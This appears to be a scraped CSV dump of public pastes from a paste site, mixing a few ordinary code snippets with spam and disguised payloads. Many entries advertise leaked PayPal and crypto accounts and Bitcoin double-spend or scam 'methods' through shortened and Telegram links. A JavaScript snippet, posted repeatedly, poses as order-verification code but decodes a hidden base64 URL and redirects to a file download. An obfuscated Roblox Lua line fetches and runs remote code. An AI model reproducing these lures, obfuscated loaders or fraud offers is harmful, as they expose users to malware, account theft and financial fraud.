id,title,username,language,date,content
NYXxgX8C,Untitled,WassupDog45,JavaScript,Monday 5th of May 2025 07:08:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54626/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZBHGDZuq,k-left-tree,egogoboy,C++,Monday 5th of May 2025 07:03:47 AM CDT,"#include <iostream>                                                                                                                                                                                         
#include <iomanip>                                                                                                                                                                                          
#include ""Node.h""                                                                                                                                                                                           
                                                                                                                                                                                                            
int getMin(Node* node);                                                                                                                                                                                     
bool isLeaf(Node* node);                                                                                                                                                                                    
                                                                                                                                                                                                            
Node* makeTree(int k, int h, int& count) {                                                                                                                                                                  
    if (h == 1 || (h > 1 && k == 0)) {                                                                                                                                                                      
        ++count;                                                                                                                                                                                            
        return new Node();                                                                                                                                                                                  
    }                                                                                                                                                                                                       
                                                                                                                                                                                                            
    return new Node(makeTree(k - 1, h - 1, count), makeTree(k, h - 1, count));                                                                                                                              
}                                                                                                                                                                                                           
                                                                                                                                                                                                            
Node* growTree(Node* node, int k, int max_k, int& count, int max_n) {                                                                                                                                       
    if (k == max_k || count == max_n) {                                                                                                                                                                     
        return node;
}                                                                                                                                                                                                       
    if (isLeaf(node)) {                                                                                                                                                                                     
        node->left = new Node();                                                                                                                                                                            
        node->right = new Node();                                                                                                                                                                           
        count++;                                                                                                                                                                                            
        return node;                                                                                                                                                                                        
    }                                                                                                                                                                                                       
                                                                                                                                                                                                            
    node->left = growTree(node->left, k + 1, max_k, count, max_n);                                                                                                                                          
    node->right = growTree(node->right, k, max_k, count, max_n);                                                                                                                                            
                                                                                                                                                                                                            
    return node;                                                                                                                                                                                            
}                                                                                                                                                                                                           
                                                                                                                                                                                                            
Node* fillTree(Node* node, int& depth) {                                                                                                                                                                    
    if (node == nullptr) {                                                                                                                                                                                  
        return nullptr;                                                                                                                                                                                     
    }                                                                                                                                                                                                       

    node->left = fillTree(node->left, depth);
    node->right = fillTree(node->right, depth);
    if (isLeaf(node)) {
        node->key = depth++;
    } else {
        node->key = getMin(node->right);
    }

    return node;
}
void printTree(Node* node, int width) {
    if (node == nullptr) {
        return;
    }
    printTree(node->right, width + 5);
    std::cout << std::string(width, ' ') << node->key << std::endl;
    printTree(node->left, width + 5);
}

int main() {
    int k, n;
    std::cin >> k >> n;
    
    int h = 1;
    int count = 0;
    Node* head = makeTree(k, h, count);
    while (count != n + 1) {
        head = growTree(head, 0, k, count, n + 1);
    }

    int depth = 0;
    head = fillTree(head, depth);

    printTree(head, 0);


    return 0;
}

bool isLeaf(Node* node) {
    return node->left == nullptr && node->right == nullptr;
}

int getMin(Node* node) {
    if (node == nullptr) {
        return 0;
    }

    if (node->left == nullptr) {
        return node->key;
    }

    return getMin(node->left);
}"
1xgXB7PC,[4761113]adapt_payslip,rht_odoo,XML,Monday 5th of May 2025 07:03:17 AM CDT,"<data><xpath expr=""/t[@t-name='hr_payroll.report_payslip']"" position=""replace"" mode=""inner""><t t-call=""web.external_layout"">
            <div class=""page"">
                <h2 id=""payslip_name"">
                    <span t-field=""o.name"">August 2023 Payslip</span>
                </h2>
                <t t-set=""is_invalid"" t-value=""o._is_invalid()""/>
                <div t-if=""is_invalid"">
                    <strong id=""invalid_warning"">
                        <span t-out=""is_invalid"">This payslip is not validated. This is not a legal document.</span>
                    </strong>
                </div>
                <div t-else="""">
                    <div class=""oe_structure""/></div>
                <table name=""employee-infos"" id=""employee_info_table_1"" class=""table table-sm table-bordered o_selected_table"">
                    <tbody>
                        <tr id=""employee_info_line_1"" class=""o_small_ten-fs"">
                            <td class=""w-25"">
                                <strong>Employee</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Marital Status</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Designation</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Pay Period</strong>
                            </td>
                        </tr>
                        <tr id=""employee_info_line_2"" class=""o_small_ten-fs"">
                            <td class=""o_selected_td"">
                                <span t-field=""o.employee_id""/>

                            </td>
                            <td>
                                <span t-field=""o.employee_id.marital""/>
                            </td>
                            <td>
                                <span t-field=""o.employee_id.job_title""/>
                            </td>
                            <td>
                                <span t-if=""o.date_from &lt; o.contract_id.date_start"" t-field=""o.contract_id.date_start"">Start Date</span>
                                <span t-else="""" t-field=""o.date_from"">From</span>
                                <span t-if=""o.contract_id.date_end and o.date_to &gt; o.contract_id.date_end"" t-field=""o.contract_id.date_end"">End Date</span>
                                <span t-else="""" t-field=""o.date_to"">To</span>
                            </td>
                        </tr>
                        <tr id=""employee_info_line_4"" class=""o_small_ten-fs"">
                            <td>
                                <br/>
                            </td>
                            <td>
                                <strong>Person in charge</strong>
                            </td>
                            <td>
                                <strong>Identification</strong>
                            </td>
                            <td>
                                <strong>Computed on </strong>
                            </td>
                        </tr>
                        <tr id=""employee_info_line_5"" class=""o_small_ten-fs"">
                            <td>
                                <span t-field=""o.employee_id.work_email""/>
                            </td>
                            <td name=""personne-in-charge"">
                                <span t-out=""o.employee_id.children""/>
                            </td>
                            <td name=""identification-id"">
                                <span t-field=""o.employee_id.identification_id""/>
                            </td>
                            <td>
                                <span t-field=""o.compute_date""/>
                            </td>
                        </tr>
                        <tr id=""employee_info_line_6"" class=""o_small_ten-fs"">
                            <td class=""w-25"">
                                <strong>Contract Start Date</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Contract Type</strong>
                            </td>
                            <td class=""w-25"">
                                <strong>Working Schedule</strong>
                            </td>
                            <td class=""w-25"" name=""company-car-title""/>
                        </tr>
                        <tr id=""employee_info_line_7"" class=""o_small_ten-fs"">
                            <td>
                                <span t-field=""o.employee_id.first_contract_date""/>
                            </td>
                            <td>
                                <span t-field=""o.employee_id.contract_id.contract_type_id""/>
                            </td>
                            <td>
                                <span t-field=""o.employee_id.contract_id.hours_per_week""/>
                            </td>
                            <td class=""w-25"" name=""company-car-model""/>
                        </tr>
                    </tbody>
                </table>
               
                <div id=""total"" class=""o_small_ten-fs"">
                    <table class=""table table-sm"">
                        <thead class=""o_black_border"">
                            <tr>
                                <th id=""line_header_name"">Name</th>
                                <th id=""line_header_days"">Nombre</th>
                                <th id=""line_header_base""> Base</th>
                                <th id=""line_header_rate""> Taux (%)</th>
                                <th id=""line_header_amount"" class=""text-end"">Total</th>
                            </tr>
                        </thead>
                        <tbody>
                            <t id=""payslip_lines"">
                                <span t-foreach=""o.line_ids.filtered(lambda line: line.appears_on_payslip)"" t-as=""line"">
                                    <t t-set=""line_styling"" t-value=""line.get_payslip_styling_dict()""/>
                                    <t t-set=""line_style""/>
                                    <t t-set=""line_class""/>
                                    <t t-if=""line.code in line_styling"">
                                        <t t-set=""line_style"" t-value=""line_styling[line.code]['line_style']""/>
                                        <t t-set=""line_class"" t-value=""line_styling[line.code]['line_class']""/></t>
                                    <tr t-att-class=""line_class"" t-att-style=""line_style"" id=""line_display"">
                                        <td id=""payslip_line_name"">
                                            <span t-field=""line.name""/>
                                        </td>
                                        <td id=""payslip_line_quantity"">
                                            <span t-if=""line.quantity &gt; 1"" t-esc=""line.quantity""/>
                                        </td>
                                        <td id=""line_base"">
                                            <span t-field=""line.amount""/>
                                        </td>
                                        <td id=""line_rate"">
                                            <span t-if=""line.rate != 100"" t-field=""line.rate"" t-options=""{'precision': 2}""/>
                                            <span t-if=""line.rate != 100""> %</span>
                                        </td>
                                        <td id=""payslip_line_total"" class=""text-end"">
                                            <span t-esc=""line.total"" t-options=""{&quot;widget&quot;: &quot;monetary&quot;, &quot;display_currency&quot;: o.company_id.currency_id}"" t-att-style=""'color:#875A7B;' if line.total &lt; 0 else ''""/>
                                        </td>
                                    </tr>
                                </span>
                            </t>
                        </tbody>
                    </table>
                    <div class=""oe_structure""/></div>
                <div id=""to_pay"">
                    <p t-if=""o.net_wage &gt;= 0"">To pay on 
                        <b>
                            <span t-field=""o.employee_id.bank_account_id"">xxxxxxxxxxxx</span>
                        </b> of 
                        <i>
                            <span t-field=""o.employee_id""/>
                        </i>: 
                        <span t-field=""o.net_wage""/>
                    </p>
                    <p t-if=""o.net_wage &lt; 0"">The net amount will be recovered from the first positive remuneration established after this.</p>
                </div>
            </div></t>
    </xpath></data>"
NFaa0C53,Make $1000 15-MINUTES  (BEGINNER) YR,Ezyw,JavaScript,Monday 5th of May 2025 07:00:28 AM CDT," 
Pdf https://tinyurl.com/freshleaks

RDvCGndiJL
"
AqGPMnU9,PayPal with Balance,navrajkhunger,JavaScript,Monday 5th of May 2025 06:53:33 AM CDT,94278 Accounts Posted On https://t.me/leakzbyeminem
29ABUsiX,Abuse RBF in BTC transactions,luqlegal,JavaScript,Monday 5th of May 2025 06:53:16 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 58568
N2BQwduM,Products.js,WassupDog45,JavaScript,Monday 5th of May 2025 06:53:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46501/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
myhpubcB,EARN $900 INSTANTLY 2025 95,Ezyw,JavaScript,Monday 5th of May 2025 06:51:12 AM CDT," 
Pdf https://tinyurl.com/freshleaks

aEQ0sBCJKR
"
SUEqgQCk,Make $1000 15-MINUTES (BEGINNER) L4,Ezyw,JavaScript,Monday 5th of May 2025 06:41:57 AM CDT," 
Pdf https://tinyurl.com/freshleaks

qknlsBHnrK
"
vucfd3Wf,Leaked Accounts - Fresh Hits,navrajkhunger,JavaScript,Monday 5th of May 2025 06:38:11 AM CDT,82406 Accounts Posted On https://t.me/leakzbyeminem
AR1g0hju,Stake Free Balance Method,luqlegal,JavaScript,Monday 5th of May 2025 06:37:54 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 10205
yb2Mue1f,EARN $900 INSTANTLY 2025⭐ GV,Ezyw,JavaScript,Monday 5th of May 2025 06:32:43 AM CDT," 
Pdf https://tinyurl.com/freshleaks

WuXRZ29TSI
"
ABfYJmzR,help,forevergaming,JavaScript,Monday 5th of May 2025 06:28:41 AM CDT,"    const getSettingsContainer = new ContainerBuilder({
        components: [
                    { 
                        type: ComponentType.TextDisplay,
                        content: (`Auction Role: ${settings.auctionRole ? `<:paidrepend:1367098048261652482> <@&${settings.auctionRole}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Blacklist Role: ${settings.blacklistRole ? `<:paidrepend:1367098048261652482> <@&${settings.blacklistRole}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Manager Role: ${settings.managerRole ? `<:paidrepend:1367098048261652482> <@&${settings.managerRole}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.Separator
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Auction Channel: ${settings.auctionChannel ? `<:paidrepend:1367098048261652482> <#${settings.auctionChannel}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Auction Category: ${settings.auctionCategory ? `<:paidrepend:1367098048261652482> <#${settings.auctionCategory}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Payout Channel: ${settings.auctionPayoutChannel ? `<:paidrepend:1367098048261652482> <#${settings.auctionPayoutChannel}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.Separator
                    },                          
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Log Channel: ${settings.auctionLogChannel ? `<:paidrepend:1367098048261652482> <#${settings.auctionLogChannel}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Mod Log Channel: ${settings.auctionModLogChannel ? `<:paidrepend:1367098048261652482> <#${settings.auctionModLogChannel}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Tax Rates:\n${settings.taxRates.map(tax => `- ${tax.percent * 100}% for <@&${tax.role}>`).join('\n')}`)
                    },
                    {
                        type: ComponentType.Separator
                    },
                    {
                        type: ComponentType.ActionRowBuilder,
                        components: [
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_role`, 
                                name: 'auction_role',
                                emoji: { id: '1367111509167181865', name: 'aucto_auction', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_blacklist`, 
                                name: 'Blacklist',
                                emoji: { id: '1367111704085008506', name: 'aucto_blacklist', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_manager`, 
                                name: 'Manager',
                                emoji: { id: '1367112061204828210', name: 'aucto_manager', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_channel`, 
                                name: 'Channel',
                                emoji: { id: '1367112275147751526', name: 'aucto_channel', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                        ], 
                    },
                    {
                        type: ComponentType.ActionRowBuilder,
                        components: [
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_category`, 
                                name: 'Category',
                                emoji: { id: '1367112420841099305', name: 'aucto_category', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_payout_channel`, 
                                name: 'Payouts',
                                emoji: { id: '1367112973968998522', name: 'aucto_payout', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_log_channel`, 
                                name: 'Logs',
                                emoji: { id: '1367112766149627984', name: 'aucto_logs', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_mod_log_channel`, 
                                name: 'Mod Logs',
                                emoji: { id: '1367112766149627984', name: 'aucto_logs', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_tax_rates`, 
                                name: 'Tax Rates',
                                emoji: { id: '1367112628962594856', name: 'aucto_dmc', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                        ], 
                    },
        ]
    })"
mG2EzHVA,Leaked Accounts - Fresh HitUntitled,BHOO100,JavaScript,Monday 5th of May 2025 06:25:23 AM CDT,343226 - check it out at www.tinyurl.com/hfleak
46WBrck2,Chaturbate with Tokens,navrajkhunger,JavaScript,Monday 5th of May 2025 06:22:49 AM CDT,80708 Accounts Posted On https://t.me/leakzbyeminem
sxxKmBk8,Scam Casinos and Stores,luqlegal,JavaScript,Monday 5th of May 2025 06:22:32 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 84530
VRKpnDRJ,EARN $900 INSTANTLY 2025⭐ GV,steventsai013000,JavaScript,Monday 5th of May 2025 06:22:23 AM CDT," 
Pdf https://tinyurl.com/freshleaks

QlRRBSVLdY
"
bP76pmuG,Market.js,WassupDog45,JavaScript,Monday 5th of May 2025 06:22:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24654/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rY2nyEss,EARN $900 INSTANTLY 2025 95,nashamuktikendraaa,JavaScript,Monday 5th of May 2025 06:12:41 AM CDT," 
Pdf https://tinyurl.com/freshleaks

EUut0Q7jmC
"
LTxAx4i6,Crypto Accounts,navrajkhunger,JavaScript,Monday 5th of May 2025 06:07:27 AM CDT,58902 Accounts Posted On https://t.me/leakzbyeminem
sS5yjFSd,Doublespending using Vanity Wallet,luqlegal,JavaScript,Monday 5th of May 2025 06:07:11 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 82032
evUEbjD6,Untitled,WassupDog45,JavaScript,Monday 5th of May 2025 06:06:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45844/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rsZHFTtz,dataNone,TestGuy1,JSON,Monday 5th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8639e9917431453b714844b1e4d052335a06a873d3746c11467c61563d74b3ef19bfb337ce83bb6a2295fa64d483765df7ac87a604c797ee8fb4774e83f2b394bf2444233216667b34fca9d92dea3f57cae63d9f7654ae5d398813299e597f3c7ff753608e5419ed93bc788b7674035c5db7c96fabf7a9ad11962cb19306c581',
  otherdata: [
    'cf672c209d3ab326a023e1469c0bbec4',
    '520b769cedf0e3c68c203f60d4ecf873',
    'f8bdf84100360c673eb7de3d193879ac',
    'f614f2ae256f680c59ee4f1d77e2a6e7',
    '41d6f470355def631c3b96aae093b6a0',
    '8bc587bcde09c1faa8063073c0613df3',
    'b4b775096c54f5852187bf36849a4929',
    '92377e61c63644201e73f2bbc4d2cad8'
  ]
}"
mqffuj6P,PayPal with Balance,navrajkhunger,JavaScript,Monday 5th of May 2025 05:52:03 AM CDT,15071 Accounts Posted On https://t.me/leakzbyeminem
nGpy6rY3,Abuse RBF in BTC transactions,luqlegal,JavaScript,Monday 5th of May 2025 05:51:43 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 18954
1SQvv19X,Untitled,navrajkhunger,JavaScript,Monday 5th of May 2025 05:51:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53162/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3ZNty3eu,Зафшированный в виде ссылки скрипт на Guess Italian Brainrot or Die,Viper4109,Lua,Monday 5th of May 2025 05:39:03 AM CDT,"local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7(""\217\215\207\53\245\225\136\81\193\194\200\49\227\185\206\16\159\192\212\40\169\169\198\9\158\200\201\115\179\181\194\70\255"",""\126\177\163\187\69\134\219\167"")))();"
b4XHBjAG,Stake Free Balance Method,luqlegal,JavaScript,Monday 5th of May 2025 05:36:22 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 74638
ndYHzD4A,Crypto Accounts,iLoveToWatch,JavaScript,Monday 5th of May 2025 05:36:21 AM CDT,16593 Accounts Posted On https://t.me/leakzbyeminem
xtZexZh1,Products.js,navrajkhunger,JavaScript,Monday 5th of May 2025 05:36:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43659/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iDFdCk5D,Template licenta latex - FII,CosminVarlan,Latex,Monday 5th of May 2025 05:27:05 AM CDT,"\documentclass[12pt]{report}

% includes
\usepackage{geometry}           % page size
\usepackage[utf8]{inputenc}     % encoding
\usepackage{palatino}           % font
\usepackage[romanian]{babel}    % language
\usepackage{graphicx}           % images
\usepackage{indentfirst}        % indentation
\usepackage[nottoc]{tocbibind}  % table of contents style
\usepackage[unicode]{hyperref}  % references from the table of contents

% includes options
\geometry{  a4paper,            % scientific thesis standard
            left=3cm,
            right=2cm,
            top=2cm,
            bottom=2cm,
 }
\graphicspath{{images/}}        % path where the images are located
\setlength{\parindent}{1cm}     % paragraph indentation

% other options
\linespread{1.5}                % space between lines
\renewcommand*\contentsname{Cuprins}    % table of contents name

% the document content
\begin{document}
    % macros (global)
    \input{front/macros}
    
    % front-matter
    \pagenumbering{gobble}
    
    \input{front/cover}
    \input{front/titlepage}
    \input{front/declaration1}
    \input{front/declaration2}
    
    % table of contents
    \tableofcontents
    
    % chapters
    \setcounter{page}{1}
    \pagenumbering{arabic}
    
    \input{chapters/motivation}
    \input{chapters/introduction}
    
    \input{chapters/chapter1}
    \input{chapters/chapter2}
    \input{chapters/chapter3}
    
    \input{chapters/conclusions}
    \input{chapters/bibliography}
\end{document}"
7PxgjMUy,PayPal with Balance,iLoveToWatch,JavaScript,Monday 5th of May 2025 05:21:00 AM CDT,36131 Accounts Posted On https://t.me/leakzbyeminem
L4DuWxAb,Scam Casinos and Stores,luqlegal,JavaScript,Monday 5th of May 2025 05:20:59 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 80590
ikzX3LWp,Order.js,navrajkhunger,JavaScript,Monday 5th of May 2025 05:20:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41728/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EEmPHn0Z,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Monday 5th of May 2025 05:05:38 AM CDT,71074 Accounts Posted On https://t.me/leakzbyeminem
vxgn9hL6,Doublespending using Vanity Wallet,luqlegal,JavaScript,Monday 5th of May 2025 05:05:38 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 70918
Be4ViSFH,Market.js,navrajkhunger,JavaScript,Monday 5th of May 2025 05:05:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91627/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aXSHeCfa,Moving Platforms,OEAgamer1,Lua,Monday 5th of May 2025 04:57:10 AM CDT,"-- ___  ___  ___                              _ 
--| . || __>| . | ___  ___ ._ _ _  ___  _ _ / |
--| | || _> |   |/ . |<_> || ' ' |/ ._>| '_>| |
--`___'|___>|_|_|\_. |<___||_|_|_|\___.|_|  |_|
--			   	 <___'                         
-- -> YT: OEAgamer1

local travelInterval = 4
local velocityCap = 30
local angularVelocityCap = 3
local shouldRemoveTargets = true

local container = script.Parent
local mover = container:FindFirstChild(""Platform"")
local positionController = mover:FindFirstChild(""AlignPosition"")
local orientationController = mover:FindFirstChild(""AlignOrientation"")

local pathPoints = {}

repeat
	local nextTarget = nil
	local smallestIndex = math.huge

